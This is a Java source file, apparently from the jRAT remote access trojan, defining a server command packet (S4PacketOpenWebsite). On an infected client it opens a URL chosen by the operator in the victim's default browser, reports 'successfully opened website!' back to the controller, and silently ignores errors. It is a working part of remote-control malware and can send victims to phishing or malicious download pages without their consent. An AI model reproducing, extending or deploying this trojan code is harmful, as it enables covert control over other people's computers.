package net.jrat.core.packet.server;

import java.awt.Desktop;
import java.net.URL;

import net.jrat.core.Client;
import net.jrat.core.packet.IPacket;
import net.jrat.core.packet.client.C1PacketMessage;

public class S4PacketOpenWebsite implements IPacket
{
	private static final long serialVersionUID = 1L;
	
	private String url;
	
	@Override
	public void execute(Object object) throws Exception
	{
		try
		{
			final URL url = new URL(this.url);
			Desktop.getDesktop().browse(url.toURI());
			Client.instance.outputStream.writeObject(new C1PacketMessage("successfully opened website!"));
		}
		catch (Exception e) {}
	}
}